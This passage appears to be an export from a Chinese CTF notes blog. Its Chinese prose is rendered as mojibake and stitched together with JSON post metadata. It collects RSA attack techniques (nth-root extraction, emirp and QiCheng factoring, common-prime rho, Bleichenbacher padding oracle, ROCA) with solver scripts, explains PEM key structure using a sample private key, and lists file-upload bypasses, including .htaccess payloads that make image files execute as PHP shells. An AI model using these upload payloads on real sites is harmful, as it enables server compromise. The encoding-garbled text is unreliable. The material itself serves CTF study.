é—®é¢˜æ˜¯ï¼Œå¦‚ä½•åœ¨æœ‰é™åŸŸå†…å¼€æ ¹ï¼Ÿ è¿™é‡Œ $e$ ä¸ $p-1$ å’Œ $q-1$ éƒ½ä¸äº’ç´ ï¼Œä¸èƒ½ç®€å•åœ°æ±‚ä¸ªé€†å…ƒå°±å®Œäº‹ã€‚ è¿™ç§æƒ…å†µä¸‹ï¼Œå¼€å¹³æ–¹æ ¹å¯ä»¥ç”¨Tonelliâ€“Shanks algorithmï¼ŒWikiè¯´è¿™ä¸ªç®—æ³•å¯ä»¥æ‰©å±•åˆ°å¼€næ¬¡æ–¹æ ¹ã€‚ åœ¨è¿™ç¯‡paperé‡Œç»™å‡ºäº†å…·ä½“çš„ç®—æ³•ï¼šAdleman-Manders-Miller rth Root Extraction Methodã€‚ è¿™ä¸ªç®—æ³•åªèƒ½å¼€å‡ºä¸€ä¸ªæ ¹ï¼Œå®é™…ä¸Šå¼€ $e$ æ¬¡æ–¹ï¼Œæœ€å¤šä¼šæœ‰ $e$ ä¸ªæ ¹ï¼ˆè¿™é¢˜çš„æƒ…å†µä¸‹æœ‰0x1337ä¸ªæ ¹ï¼‰ã€‚ å¦‚ä½•æ‰¾åˆ°å…¶ä»–æ ¹ï¼Ÿ StackOverflow â€“ Cube root modulo P ç»™å‡ºäº†æ–¹æ³•ã€‚ å¦‚ä½•æ‰¾åˆ°æ‰€æœ‰çš„primitive 0x1337th root of 1? StackExchange â€“ Finding the n-th root of unity in a finite field ç»™å‡ºäº†æ–¹æ³•ã€‚ Exploitï¼ˆä»¥ e=0x1337â€‹ ä¸ºä¾‹ï¼‰ å…ˆç”¨Adleman-Manders-Miller rth Root Extraction Methodåœ¨ $\\text{GF}(p)$ å’Œ $\\text{GF}(q)$ ä¸Šå¯¹ $c$ å¼€ $e$ æ¬¡æ–¹æ ¹ï¼Œåˆ†åˆ«å¾—åˆ°ä¸€ä¸ªè§£ã€‚å¤§æ¦‚ä¸åˆ°10ç§’ã€‚ ç„¶åå»æ‰¾åˆ°æ‰€æœ‰çš„0x1336ä¸ªprimitive nth root of 1ï¼Œä¹˜ä»¥ä¸Šé¢é‚£ä¸ªè§£ï¼Œå¾—åˆ°æ‰€æœ‰çš„0x1337ä¸ªè§£ã€‚å¤§æ¦‚1åˆ†é’Ÿã€‚ å†ç”¨CRTå¯¹ $\\text{GF}(p)$ å’Œ $\\text{GF}(q)$ ä¸Šçš„ä¸¤ç»„0x1337ä¸ªè§£ç»„åˆæˆ $\\bmod n$ ä¸‹çš„è§£ï¼Œå¯ä»¥å¾—åˆ°0x1337**2=24196561ä¸ª $\\bmod n$ çš„è§£ã€‚æœ€åèƒ½é€šè¿‡check()çš„å³ä¸ºflagã€‚å¤§æ¦‚åå‡ åˆ†é’Ÿã€‚ 12345678910111213141516#è„šæœ¬1#Sagec = p = q = e = for mp in GF(p)(c).nth_root(e, all=True): for mq in GF(q)(c).nth_root(e, all=True): m = crt([ZZ(mp), ZZ(mq)], [p, q]) try: res = bytes.fromhex(hex(m)[2:]) if res.isascii(): print(res) except: pass 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#è„šæœ¬2#Sageimport randomimport time# About 3 seconds to rundef AMM(o, r, q): start = time.time() print(&#x27;\\n----------------------------------------------------------------------------------&#x27;) print(&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;) print(&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;.format(r, o, q)) g = GF(q) o = g(o) p = g(random.randint(1, q)) while p ^ ((q-1) // r) == 1: p = g(random.randint(1, q)) print(&#x27;[+] Find p:&#123;&#125;&#x27;.format(p)) t = 0 s = q - 1 while s % r == 0: t += 1 s = s // r print(&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;.format(s, t)) k = 1 while (k * s + 1) % r != 0: k += 1 alp = (k * s + 1) // r print(&#x27;[+] Find alp:&#123;&#125;&#x27;.format(alp)) a = p ^ (r**(t-1) * s) b = o ^ (r*alp - 1) c = p ^ s h = 1 for i in range(1, t): d = b ^ (r^(t-1-i)) if d == 1: j = 0 else: print(&#x27;[+] Calculating DLP...&#x27;) j = - discrete_log(a, d) print(&#x27;[+] Finish DLP...&#x27;) b = b * (c^r)^j h = h * c^j c = c ^ r result = o^alp * h end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) print(&#x27;Find one solution: &#123;&#125;&#x27;.format(result)) return resultdef findAllPRoot(p, e): print(&quot;Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;.&quot;.format(e, p)) start = time.time() proot = set() while len(proot) &lt; e: proot.add(pow(random.randint(2, p-1), (p-1)//e, p)) end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) return prootdef findAllSolutions(mp, proot, cp, p): print(&quot;Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.&quot;.format(e, cp, p)) start = time.time() all_mp = set() for root in proot: mp2 = mp * root % p assert(pow(mp2, e, p) == cp) all_mp.add(mp2) end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) return all_mpc = p = q = e = 0x1337cp = c % pcq = c % qmp = AMM(cp, e, p)mq = AMM(cq, e, q)p_proot = findAllPRoot(p, e)q_proot = findAllPRoot(q, e)mps = findAllSolutions(mp, p_proot, cp, p)mqs = findAllSolutions(mq, q_proot, cq, q)print(mps, mqs)def check(m): h = m.hex() if len(h) &amp; 1: return False if bytes.fromhex(h).startswith(b&#x27;NCTF&#x27;): print(bytes.fromhex(h)) return True else: return False# About 16 mins to run 0x1337^2 == 24196561 times CRTstart = time.time()print(&#x27;Start CRT...&#x27;)for mpp in mps: for mqq in mqs: solution = CRT_list([int(mpp), int(mqq)], [p, q]) if check(solution): print(solution) print(time.time() - start)end = time.time()print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) â€‹ SMUPE é—®é¢˜ï¼ˆä¸åŒN,eåŠ å¯†çº¿æ€§å…³ç³»æ˜æ–‡ï¼‰a system of univariate polynomial equations problem = ä¸€å…ƒå¤šé¡¹å¼æ–¹ç¨‹ç»„æ±‚è§£é—®é¢˜ å®šä¹‰ $k$ æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œ$N$ ä¸ºæ»¡è¶³RSAç®—æ³•çš„æ¨¡æ•°ï¼Œ$\\delta$ æ˜¯å¤šé¡¹å¼çš„é˜¶ã€‚æœ‰ $N_i&lt;N_{i+1},\\delta_i \\in N\\quad(i=1,2,\\cdots,k)$ å¤šé¡¹å¼æ–¹ç¨‹ç»„è¡¨ç¤ºå¦‚ä¸‹, ç›®çš„æ˜¯æ±‚è§£ $x$ï¼š $\\begin{cases} f_1(x)\\equiv 0 \\pmod {N_1}\\newline f_2(x)\\equiv 0 \\pmod {N_2} \\newline {\\vdots} \\newline f_k(x)\\equiv 0 \\pmod {N_k} \\end{cases}$ æ±‚è§£æ¡ä»¶ Alexander May, Maike Ritzenhofentæå‡ºä¸€ç§æ±‚è§£æ–¹æ³•ï¼Œç®€å•åœ°è¯´å½“å¤šé¡¹å¼çš„é˜¶ $\\delta$ æ»¡è¶³ä»¥ä¸‹æƒ…å†µæ—¶å¯è§£ï¼ˆ$\\delta$ æ˜¯å¤šé¡¹å¼çš„é˜¶ï¼‰ï¼š $\\sum\\limits_{i=1}^k \\cfrac{1}{\\delta_i} \\geq 1$ å…·ä½“æè¿°ï¼š ä»¤ $(f_i,\\delta_i,N_i) \\quad(i=1,2,\\cdots,k)$ ä½œä¸ºSMUPEé—®é¢˜çš„é¦–ä¸€å¤šé¡¹å¼ç»„ï¼Œ å®šä¹‰ $M=\\prod\\limits_{i=1}^k N_i^{\\frac{\\delta}{\\delta_i}},\\delta=\\text{lcm}(\\delta_i) \\quad (i=1,2,\\cdots,k)$ åˆ™SMUPEé—®é¢˜å¯ä»¥åœ¨ $O(\\delta^6\\cdot \\log_2M)$ å¤æ‚åº¦è§£å†³ã€‚ å‚è€ƒï¼š2019çº¢å¸½æ¯ - ç²¾æ˜çš„Alice â€‹ åç´ æ•°ï¼ˆemirpæ•°ï¼‰å·²çŸ¥ï¼š$q=\\text{reverse_x}(p)$ï¼Œ$\\text{x}$ ä¸ºè¿›åˆ¶æ•°ã€‚ çˆ†ç ´æ€è·¯ç±»ä¼¼RSA parity oracleã€‚$p,q$ æ˜¯bitç¿»è½¬å…³ç³»ï¼Œå·²çŸ¥ $p$ æœ€ä½çš„ $k$ ä½ï¼Œåˆ™å·²çŸ¥ $q$ æœ€é«˜çš„ $k$ ä½ã€‚ å‡è®¾å·²çŸ¥ $k$ ä½çš„ $p,q$ï¼Œè®°ä¸º $ph,qh$ï¼Œåˆ©ç”¨ä¸ç­‰å¼ $ph\\cdot qh\\cdot 2^{1024-2k}&lt;=n&lt;(ph+1)\\cdot(qh+1)\\cdot 2^{1024-2k}$ ï¼Œ é€ä½å‘ä½åœ°å€çˆ†ç ´ï¼Œä¸æ–­æ”¶ç¼©ä¸ç­‰å¼çš„èŒƒå›´ï¼Œæœ€ç»ˆå¯æ±‚å¾— $n$ å€¼ã€‚ å‚è€ƒï¼š ASIS 2015 Finals: RSASR Midnight Sun CTF 2020 Quals RoarCTF 2020 - Reverse 1234567891011121314151617181920212223242526272829#python2#x=10n = 6528060431134312098979986223024580864611046696815854430382374273411300418237131352745191078493977589108885811759425485490763751348287769344905469074809576433677010568815441304709680418296164156409562517530459274464091661561004894449297362571476259873657346997681362092440259333170797190642839587892066761627543def t(a, b, k): # sqrt(n) has 155 digits, so we need to figure out 77 digits on each side if k == 77: if a*b == n: print a, b return for i in xrange(10): for j in xrange(10): # we try to guess the last not-already-guessed digits of both primes a1 = a + i*(10**k) + j*(10**(154-k)) b1 = b + j*(10**k) + i*(10**(154-k)) if a1*b1 &gt; n: # a1 and b1 are too large continue if (a1+(10**(154-k)))*(b1+(10**(154-k))) &lt; n: # a1 and b1 are too small continue if ((a1*b1)%(10**(k+1))) != (n%(10**(k+1))): # The last digits of a1*b1 (which won&#x27;t change later) doesn&#x27;t match n continue # this a1 and b1 seem to be a possible match, try to guess remaining digits t(a1, b1, k+1)# the primes have odd number of digits (155), so we try all possible middle digits (it simplifies the code)for i in xrange(10): t(i*(10**77), i*(10**77), 0) â€‹ 4p-1 methodå¯¹ä½¿ç”¨ä¸€ç±»ç‰¹å®šç´ æ•°ä¹˜ç§¯çš„æ¨¡æ•°çš„åˆ†è§£ã€‚ å½“ä¸€ç±»ç‰¹æ®Šçš„ç´ æ•°ç”¨åœ¨ RSA æ¨¡æ•°ä¸­æ—¶ï¼Œå¯ä»¥è½»æ˜“çš„å°†è¯¥ç´ æ•°ä» $n$ ä¸­åˆ†è§£å‡ºæ¥ã€‚ç”±äºè¿™ä¸€ç±»ç´ æ•°éƒ½å½¢å¦‚ $4pâˆ’1=Ds^2$ï¼Œå› æ­¤åˆè¢«ç§°ä¸º 4p-1 methodã€‚æ­¤å¤–ï¼Œæœ‰äº›äººä¹Ÿä¼šå°†å…¶è§†ä¸º RSA çš„åé—¨ä¹‹ä¸€ï¼Œç§°ä¹‹ä¸º RSA backdoorã€‚ QiCheng Prime $Ds=\\{3,11,19,43,67,163\\}$ 12345678910111213141516171819202122232425262728import syssys.setrecursionlimit(10^6)def QiCheng(n): R = Integers(n) attempts = 20 js = [0, (-2^5)^3, (-2^5*3)^3, (-2^5*3*5)^3, (-2^5*3*5*11)^3, (-2^6*3*5*23*29)^3] for _ in range(attempts): for j in js: if j == 0: a = R.random_element() E = EllipticCurve([0, a]) else: a = R(j)/(R(1728)-R(j)) c = R.random_element() E = EllipticCurve([3*a*c^2, 2*a*c^3]) x = R.random_element() z = E.division_polynomial(n, x) g = gcd(z, n) if g &gt; 1: return gn = p = int(QiCheng(Integer(n))) Masaaki Shirase &amp; Vladimir Sedlacek Improvement æ›´å¤š $Ds$ å€¼ã€‚ CM-based factorization å‚è€ƒï¼š æµ…è°ˆ QiCheng Prime NCTF 2020 - RSA_revenge CryptoHack Challenge - RSA Backdoor Viability â€‹ Common Prime RSAæƒ…å½¢ï¼š$\\gcd(p-1,q-1)=g$ åˆ†è§£çš„næ–¹æ³•æœ‰å››ç§ï¼š ï¼ˆ1ï¼‰ä¿®æ”¹Pollardâ€™s rhoæ–¹æ³•åˆ†è§£nï¼› ï¼ˆ2ï¼‰çŸ¥é“aã€bçš„å€¼åˆ†è§£nï¼› ï¼ˆ3ï¼‰çŸ¥é“gçš„å€¼åˆ†è§£nï¼› ï¼ˆ4ï¼‰åˆ†è§£N-1ã€‚ 12345678910111213141516171819202122232425# Pollardâ€™s rhofrom Crypto.Util.number import *import gmpy2def f(x, n): return (pow(x, n - 1, n) + 3) % ndef rho(n): i = 1 print &#x27;Factorizing&#x27; while True: x1 = getRandomRange(2, n) x2 = f(x1, n) j = 1 while True: p = gmpy2.gcd(abs(x1 - x2), n) if p == n: break elif p &gt; 1 and isPrime(p): print &#x27;Found!&#x27; return (p, n // p) else: x1 = f(x1, n) x2 = f(f(x2, n), n) j += 1 i += 1 å‚è€ƒï¼šCommon Prime RSA ç¬”è®° â€‹ RSA Padding Oracle AttackRSA PKCS #1 v1.5 å¡«å……ç”¨äºéœ€è¦RSAåŠ å¯†çš„ä¿¡æ¯ï¼Œä¸ºäº†åŠ å¯†Kï¼Œæ¶ˆæ¯é¦–å…ˆè¢«0x00ã€ä¸€äº›éšæœºå­—èŠ‚å’Œ0x00 0x02å¡«å……ï¼Œéšæœºå­—èŠ‚çš„é€‰æ‹©æ–¹å¼æ˜¯ä¸ºäº†è®©å¡«å……çš„ä¿¡æ¯è¾¾åˆ°ç‰¹å®šçš„å—é•¿åº¦ï¼ˆ1024ã€2048æˆ–4096ä½ï¼‰ã€‚ PKCS #1 v1.5 æ ‡å‡†ä¸­å¯ä»¥ä¼ªé€ RSAç­¾åã€‚ Bleichenbacheræ”»å‡» å¯ä»¥è¯†åˆ«åœ¨ 0x00 02 åä»¥æ˜æ–‡å¼€å§‹çš„å¯†æ–‡ä¿¡æ¯ï¼Œç„¶åè¿›è¡ŒPadding Oracleæ”»å‡»æ¥è§£å¯†é¢„ä¸»å¯†é’¥ï¼Œè¿›ä¸€æ­¥å¯ä»¥å–å¾—SSLçš„ä¼šè¯å¯†é’¥ã€‚ å……åˆ†åˆ©ç”¨ 0x00 02 å¼€å¤´çš„ç‰¹æ€§ï¼Œå‡è®¾æ”»å‡»è€…è·å¾—å¯†æ–‡ $C_0$ï¼Œæƒ³æ¢å¤å‡ºæ˜æ–‡ $M_0$ã€‚æ”»å‡»æ–¹æ³•æ˜¯é€šè¿‡å‘æœåŠ¡å™¨å¤šæ¬¡å‘é€ä¿®æ”¹åçš„å¯†æ–‡ï¼Œåˆ†æå“åº”æ˜¯æ­£ç¡®è¿˜æ˜¯é”™è¯¯æ¥ç¡®å®šä¿®æ”¹ç»“æœï¼Œè¿›è€Œè§£å¯†ä¿¡æ¯ã€‚ å¦‚æœæ”¶åˆ°æ­£ç¡®ï¼Œåˆ™è¡¨ç¤ºæ˜¯ 0x00 02 å¼€å¤´ï¼Œé‚£ä¹ˆ $2B \\lt m \\lt 3B-1$ï¼Œä¸” $B=2^{8(L-2)}$ï¼Œè€Œä¸”åŸºäºRSAåŠ å¯†çš„å»¶å±•æ€§ï¼Œå¯å¾— $C=(C_0S)\\bmod N=(M_0S)^e \\bmod N$ ï¼Œæ”»å‡»è€…å¯ç”¨ $C$ è¿›è¡ŒæŸ¥è¯¢ï¼Œå¦‚æœæ”¶åˆ°é”™è¯¯åˆ™å¢åŠ  $S$ï¼Œå¹¶é‡å¤ä¸Šä¸€æ­¥éª¤ã€‚ æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ 0x00 02 å¤§å¹…åº¦å‡å°‘å¯èƒ½çš„å–å€¼ï¼Œ$2B \\lt M_0S-rN \\lt 3B$ï¼Œå› æ­¤æ”»å‡»è€…èƒ½å¤Ÿé™ä½èŒƒå›´$\\cfrac{2B+rN}{S} \\lt M_0 \\lt \\cfrac{3B+rN}{S}$ï¼Œç„¶åè¿­ä»£é€‰æ‹© $S$ï¼Œè¿›è¡ŒOracleæŸ¥è¯¢ï¼Œè®¡ç®—æ–°çš„ $r$ å€¼ï¼Œæ”»å‡»è€…ä¾¿å¯ä»¥ä¸æ–­ç¼©å°åŒ…å« $M_0$ çš„èŒƒå›´ï¼Œä¸æ–­é‡å¤ç›´åˆ°æœ€ååªå‰©å”¯ä¸€è§£ã€‚ å‚è€ƒï¼š Chosen Ciphertext Attacks Against Protocols Based on the RSA Encryption Standard PKCS #1 Bleichenbachers â€œMillion Message Attackâ€ on RSA Pwnhub - pkcs_fix â€‹ Return of Coppersmithâ€™s attack (ROCA)CVE-2017-15361 å½¢å¦‚ $p=kM+(65537^a \\bmod M)$ ç”Ÿæˆç´ æ•°çš„RSAç³»ç»Ÿï¼Œ$M$ æ˜¯å‰ $n$ ä¸ªè¿ç»­ç´ æ•°çš„ä¹˜ç§¯ï¼Œ$n$ æ˜¯ä»…å–å†³äºæ‰€éœ€å¯†é’¥å¤§å°çš„å¸¸æ•°ã€‚ https://github.com/jvdsn/crypto-attacks/blob/master/attacks/factorization/roca.py https://github.com/FlorianPicca/ROCA â€‹ PEMå¯†é’¥ç”±-----BEGIN &lt;TAG&gt;-----å¼€å¤´ï¼Œ-----END &lt;TAG&gt;-----ç»“å°¾ï¼Œä¸­é—´æ˜¯Base64ç¼–ç çš„ä¸€ä¸²äºŒè¿›åˆ¶ï¼Œæ¯64ä¸ªå­—æ¯ï¼ˆå³è§£ç åçš„48bytesï¼‰æœ‰ä¸€ä¸ªæ¢è¡Œã€‚ä¸­é—´çš„Base64è§£ç åæ˜¯ä¸€ä¸²éµå¾ªASN.1åè®®çš„DERç¼–ç ï¼Œç®€å•æ¥è¯´å¯ä»¥çœ‹æˆä¸€ç§åºåˆ—åŒ–ï¼ŒæŠŠä¸€ä¸ªç»“æ„ä½“ä¸­çš„æ•´æ•°ã€å­—ä¸²ç­‰ç¼–ç æˆä¸€ä¸ªæ–¹ä¾¿ä¼ è¾“çš„äºŒè¿›åˆ¶ã€‚ ç”Ÿæˆä»£ç ï¼š 1234567891011from Crypto.PublicKey import RSArsa = RSA.generate(1024)pk = rsa.publickey().exportKey()sk = rsa.exportKey()with open (&#x27;./pub.pem&#x27;, &#x27;wb&#x27;) as f: f.write(pk)with open (&#x27;./priv.pem&#x27;, &#x27;wb&#x27;) as f: f.write(sk) RSAç§é’¥123-----BEGIN RSA PRIVATE KEY-----...Base64 encoded key...-----END RSA PRIVATE KEY----- RFC3447å®šä¹‰ï¼š 123456789101112131415RSAPrivateKey ::= SEQUENCE &#123; version Version, modulus INTEGER, -- n publicExponent INTEGER, -- e privateExponent INTEGER, -- d prime1 INTEGER, -- p prime2 INTEGER, -- q exponent1 INTEGER, -- d mod (p-1) exponent2 INTEGER, -- d mod (q-1) coefficient INTEGER, -- (inverse of q) mod p otherPrimeInfos OtherPrimeInfos OPTIONAL&#125;Version ::= INTEGER &#123; two-prime(0), multi(1) &#125; (CONSTRAINED BY &#123;-- version must be multi if otherPrimeInfos present --&#125;) ä¾‹ï¼š 13082025d02010002818100a0d154d5bf97c40f7797b44819d09c608fa4b5c38e70d83bc13267138c6eff4c1aacefe3ddb571e1b41d911c7ab6136cf90493189563450e1f4270cabbc4207c54c4da7b84a20311cfbbabe82b9fe60bdf48a08d57839d0cdf9464d84262bcc06bc308095a6987f60ad07d669a312b5a7e4133213788eecf25863248b91349ef02030100010281800f8270c496903bf3e3ec4912450f15edc81cb1fcf4b154615aee11fbd428e64d402b5a8d66d5f770358f3e6df935b324e8d5349c83d7c992a5982249a31734acb1db19c4c8d829267514bc1ef7bbfbe242d4350f67a002a56d33e56d1a94adc71c68f020dc39ab7d0064c111b164e26ba0698dc94a03cdfd516ffd966e877949024100ca97e49c058237f96e99118ce383f91912cba1163de9236181ff754ef3ef1a260fac8d2d9aee866d51a8b6836983b05cf850e786289b6859925bc8695fc67c47024100cb3630aafffcb29607f0833dc7f05c143ee92fadfe975da4cf6719e71226bee72562e8631328a25d7351507a8d43c1295ab6ea242b60a28b109233a983f4211902401b4a32a541a8b4d988a85dd0d8a4e25d1a470bbfef3f0461121dd3337b706dd94aab37a9390180622169d48c071e921733ebd204245c2ac6460ccf0642bc7de90241008d9f44a7c823eaaa58fa2bdd20bcc8cf6b50c463f4acb51ca956e75c7ceff7d7cbdc74aca7ab880cacd39cccec2aae320e00b0896899be6e40ac43c8fe2763f1024100c67ca6d988f53abea82159431a146512a8d942978d4a8f83f2d426f1095e3bf1b5b9b8b1ccbbad2a31c6401880447a45f5e0790269061ac13b5f68f1777d7f07 30æ˜¯Sequenceçš„tagï¼Œ82æ˜¯æŒ‡æ¥ä¸‹æ¥åä¸¤ä¸ªbytesæ˜¯è¿™ä¸ªSequenceçš„é•¿åº¦ï¼Œå³0x025dä¸ªbytesï¼Œä¹Ÿå°±æ˜¯å‰©ä¸‹å…¨éƒ¨éƒ½æ˜¯ï¼›æ¥ç€çš„020100å°±æ˜¯æ•´æ•°0ï¼Œå…¶ä¸­02æ˜¯æ•´æ•°çš„tagï¼Œ01æ˜¯è¿™ä¸ªæ•´æ•°å 1byteï¼Œ00æ˜¯valueåŒæ ·çš„æ–¹æ³•ä¹Ÿå¯ä»¥è§£02818100a0...å’Œåé¢å…¶ä»–æ•´æ•°ï¼Œæ‹†åˆ†ï¼š 1234567891011121314151617181920212223242526272829303082025d # Begin Sequence: len=0x025d0201 # Version: (len=0x01)00028181 # n: (len=0x81)00a0d154d5bf97c40f7797b44819d09c608fa4b5c38e70d83bc13267138c6eff4c1aacefe3ddb571e1b41d911c7ab6136cf90493189563450e1f4270cabbc4207c54c4da7b84a20311cfbbabe82b9fe60bdf48a08d57839d0cdf9464d84262bcc06bc308095a6987f60ad07d669a312b5a7e4133213788eecf25863248b91349ef0203 # e: (len=0x03)010001028180 # d: (len=0x80)0f8270c496903bf3e3ec4912450f15edc81cb1fcf4b154615aee11fbd428e64d402b5a8d66d5f770358f3e6df935b324e8d5349c83d7c992a5982249a31734acb1db19c4c8d829267514bc1ef7bbfbe242d4350f67a002a56d33e56d1a94adc71c68f020dc39ab7d0064c111b164e26ba0698dc94a03cdfd516ffd966e8779490241 # p: (len=0x41)00ca97e49c058237f96e99118ce383f91912cba1163de9236181ff754ef3ef1a260fac8d2d9aee866d51a8b6836983b05cf850e786289b6859925bc8695fc67c470241 # q: (len=0x41)00cb3630aafffcb29607f0833dc7f05c143ee92fadfe975da4cf6719e71226bee72562e8631328a25d7351507a8d43c1295ab6ea242b60a28b109233a983f421190240 # d mod (p-1): (len=0x40)1b4a32a541a8b4d988a85dd0d8a4e25d1a470bbfef3f0461121dd3337b706dd94aab37a9390180622169d48c071e921733ebd204245c2ac6460ccf0642bc7de90241 # d mod (q-1): (len=0x41)008d9f44a7c823eaaa58fa2bdd20bcc8cf6b50c463f4acb51ca956e75c7ceff7d7cbdc74aca7ab880cacd39cccec2aae320e00b0896899be6e40ac43c8fe2763f10241 # (inverse of q) mod p: (len=0x41)00c67ca6d988f53abea82159431a146512a8d942978d4a8f83f2d426f1095e3bf1b5b9b8b1ccbbad2a31c6401880447a45f5e0790269061ac13b5f68f1777d7f07 # End Sequence RSAå…¬é’¥123-----BEGIN PUBLIC KEY-----...Base64 encoded key...-----END PUBLIC KEY----- ä¾‹ï¼š 130819f300d06092a864886f70d010101050003818d0030818902818100a0d154d5bf97c40f7797b44819d09c608fa4b5c38e70d83bc13267138c6eff4c1aacefe3ddb571e1b41d911c7ab6136cf90493189563450e1f4270cabbc4207c54c4da7b84a20311cfbbabe82b9fe60bdf48a08d57839d0cdf9464d84262bcc06bc308095a6987f60ad07d669a312b5a7e4133213788eecf25863248b91349ef0203010001 æ‹†åˆ†ï¼š 1234567891011121314151617181920212223242530819f # Begin Main Sequence: len=0x9f300d # Begin Sub1 Sequence: len=0x0d0609 # algo_oid: (1.2.840.113549.1.1.1 - PKCSv1.2)2a864886f70d0101010500 # params: (null) # End Sub1 Sequence03818d # BitString: len=0x8d ([n, e])00308189 # Begin Sub2 Sequence: len=0x89028181 # n:00a0d154d5bf97c40f7797b44819d09c608fa4b5c38e70d83bc13267138c6eff4c1aacefe3ddb571e1b41d911c7ab6136cf90493189563450e1f4270cabbc4207c54c4da7b84a20311cfbbabe82b9fe60bdf48a08d57839d0cdf9464d84262bcc06bc308095a6987f60ad07d669a312b5a7e4133213788eecf25863248b91349ef0203 # e:010001 # End Sub2 Sequence # End Main Sequence å‚è€ƒæ‰‹æ’•PEMå¯†é’¥ â€‹ è¯¦ç»†åŸç†äºŒåå¹´ä»¥æ¥å¯¹ RSA å¯†ç ç³»ç»Ÿæ”»å‡»ç»¼è¿° CTF Wiki - RSA 0xDktbâ€™s Blog RSAå¸¸è§æ”»å‡»æ–¹æ³• Cryptanalysis of RSA and Itâ€™s Variants","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://lazzzaro.github.io/tags/RSA/"}],"author":"Lazzaro"},{"title":"æ–‡ä»¶ä¸Šä¼ ","slug":"web-æ–‡ä»¶ä¸Šä¼ ","date":"2020-05-06T13:13:00.000Z","updated":"2023-08-03T15:09:15.228Z","comments":true,"path":"2020/05/06/web-æ–‡ä»¶ä¸Šä¼ /","permalink":"https://lazzzaro.github.io/2020/05/06/web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"","text":"â€‹ ç»•è¿‡å§¿åŠ¿å®¢æˆ·ç«¯æ ¡éªŒ ç¦ç”¨JS æŠ“åŒ…æ”¹åŒ…bpæŠ“åŒ…åæ”¹åç¼€å â€‹ æœåŠ¡ç«¯æ ¡éªŒMIMEç±»å‹æ£€æµ‹MIMEç±»å‹åœ¨htmlæ–‡ä»¶ä¸­ä½¿ç”¨content-typeå±æ€§è¡¨ç¤ºã€‚ å¸¸è§æ–‡ä»¶åå¯¹åº”çš„MIMEç±»å‹ï¼š gif â€”&gt; image/gifï¼Œpng â€”&gt; image/pngï¼Œjpg â€”&gt; image/jpgï¼Œjs â€”&gt; text/javascriptï¼Œhtm/html â€”&gt; text/html â€‹ åç¼€åé»‘åå•æ ¡éªŒç»•è¿‡æ–¹æ³• å¤§å°å†™ç»•è¿‡ï¼Œä¾‹å¦‚ Php/PhP/PHP åˆ©ç”¨é»‘åå•ä¸­æ²¡æœ‰çš„ï¼Œä½†æ˜¯åˆèƒ½å¤Ÿè¢«è§£æçš„åç¼€åï¼Œä¾‹å¦‚ phpã€php3ã€php4ã€php5ã€php7ã€phtã€phtmlã€phps 00æˆªæ–­ æ³¨ï¼šéœ€è¦magic_quotes_gpc=Offï¼ŒåŸºäºä¸€ä¸ªç»„åˆé€»è¾‘æ¼æ´ åœ¨ç¬¬ä¸€ä¸ªåç¼€åååŠ ä¸€ä¸ªç©ºæ ¼(0x20)ï¼Œä½¿ç”¨bp-&gt;repeater-&gt;hexï¼Œå°†å…¶æ”¹æˆ0x00 .htaccessæ–‡ä»¶ä¸Šä¼ è§£æ è¯¥æ–‡ä»¶å¯ä»¥ç†è§£ä¸ºApacheçš„åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ä¸­æ”¾ç½®ï¼Œä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®/etc/apache2/apache2.confï¼Œé»˜è®¤æ˜¯NONEï¼Œéœ€è¦ä¸ºALL 123&lt;FilesMatch &quot;xxx.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMacth&gt; ä¸èƒ½å†™&lt;?æ—¶ä½¿ç”¨ä¼ªåè®®ï¼š 12AddType application/x-httpd-php .xxxphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.xxx&quot; ä¸èƒ½å‡ºç°æŸäº›å…³é”®å­—ï¼ˆå¦‚phæˆ–phpï¼‰æ—¶ï¼Œä½¿ç”¨åæ–œæ ï¼ˆ\\ï¼‰æ‹¼æ¥ç»•è¿‡ï¼Œå¹¶å¼€å¯çŸ­æ ‡ç­¾ï¼š 1234567AddType application/x-httpd-p\\hp .jpgp\\hp_value au\\to_append_file &quot;p\\hp://filter/convert.base64-decode/resource=shell.jpg&quot;p\\hp_value short_open_tag 1 ç»•è¿‡ exif_imagetype() è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åï¼š 12345678æ–¹æ³•1ï¼š#define width 1337#define height 1337æ–¹æ³•2ï¼šåœ¨.htaccesså‰æ·»åŠ \\x00\\x00\\x8a\\x39\\x8a\\x39(è¦åœ¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ä¸­æ·»åŠ ï¼Œæˆ–è€…ä½¿ç”¨pythonçš„bytesç±»å‹)\\x00\\x00\\x8a\\x39\\x8a\\x39 æ˜¯wbmpæ–‡ä»¶çš„æ–‡ä»¶å¤´.htaccessä¸­ä»¥\\x00å¼€å¤´çš„åŒæ ·ä¹Ÿæ˜¯æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥ä¸ä¼šå½±å“.htaccess å‚è€ƒï¼š .htaccessçš„ä½¿ç”¨æŠ€å·§æ€»ç»“ .user.iniä¸Šä¼  